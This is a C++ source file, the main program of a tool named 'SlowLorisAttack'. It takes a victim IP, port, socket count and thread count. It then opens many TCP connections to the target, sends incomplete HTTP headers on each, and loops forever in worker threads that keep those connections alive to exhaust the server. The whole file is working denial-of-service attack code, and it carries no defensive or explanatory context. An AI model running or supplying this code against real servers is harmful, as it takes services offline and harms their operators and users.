#include "attack.h"
#include "platform.h"
#include <iostream>
#include <vector>
#include <thread>

int main(int argc, char* argv[])
{
    const int ARGS = 4;
    if (argc != (ARGS + 1))
    {
        std::cerr << "Arg 1: VICTIM IP" << std::endl;
        std::cerr << "Arg 2: VICTIM PORT NUM" << std::endl;
        std::cerr << "Arg 3: NUM OF SOCKETS" << std::endl;
        std::cerr << "Arg 4: NUM OF THREADS" << std::endl;
        std::cerr << "Usage: ./SlowLorisAttack <dest_ip> <dest_port_num> <num_sockets> <num_threads>" << std::endl;
        return 1;
    }

    const char* victimIP = argv[1];
    unsigned short victimPORT = atoi(argv[2]);
    int totalSockets = atoi(argv[3]);
    int numThreads = atoi(argv[4]);

    if (!initializePlatform())
    {
        std::cerr << "Platform initialization failed." << std::endl;
        return 1;
    }

    std::vector<std::thread> threadArray(numThreads);
    int socketDensity = totalSockets / numThreads;
    std::vector<std::vector<int>> socketListPartitions(numThreads);

    struct sockaddr_in victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(victimPORT);
    if (inet_pton(AF_INET, victimIP, &victim.sin_addr) <= 0)
    {
        std::cerr << "Invalid address/ Address not supported" << std::endl;
        cleanupPlatform();
        return 1;
    }

    for (int i = 0; i < numThreads; i++)
    {
        int numSockets = (i == numThreads - 1) ? (socketDensity + totalSockets % numThreads) : socketDensity;
        socketListPartitions[i].resize(numSockets);

        for (int j = 0; j < numSockets; j++)
        {
            socketListPartitions[i][j] = socket(AF_INET, SOCK_STREAM, 0);
            if (socketListPartitions[i][j] < 0)
            {
                std::cerr << "Could not create socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
                cleanupPlatform();
                return 1;
            }

            std::cout << "Successfully created socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
            int check = connect(socketListPartitions[i][j], (struct sockaddr*)&victim, sizeof(victim));

            if (check < 0)
            {
                std::cerr << "Could not connect socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
                std::cerr << "Perhaps a nonexistent IP or unopened port?" << std::endl;
                cleanupPlatform();
                return 1;
            }

            std::cout << "Successfully connected socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
            initialSendSocket(socketListPartitions[i][j]);
            std::cout << "Successfully sent incomplete header for socket " << j + 1 << " on thread #" << i + 1 << "." << std::endl;
        }
    }

    int iterations = 1;
    while (true)
    {
        std::cout << "Restarting attacks.." << std::endl;

        for (int i = 0; i < numThreads; i++)
        {
            std::cout << "Keeping sockets on thread #" << i + 1 << " open.." << std::endl;
            threadArray[i] = std::thread(spamPartialHeaders, victim, std::ref(socketListPartitions[i]));
        }

        for (int i = 0; i < numThreads; i++)
        {
            threadArray[i].join();
            std::cout << "Attacks on thread #" << i + 1 << " paused." << std::endl;
        }

        std::cout << "Iteration " << iterations << " completed." << std::endl;
        iterations++;
        std::this_thread::sleep_for(std::chrono::milliseconds(15000)); // Increase sleep time to be effective
        std::cout << "------------" << std::endl;
    }

    cleanupPlatform();
    return 0;
}
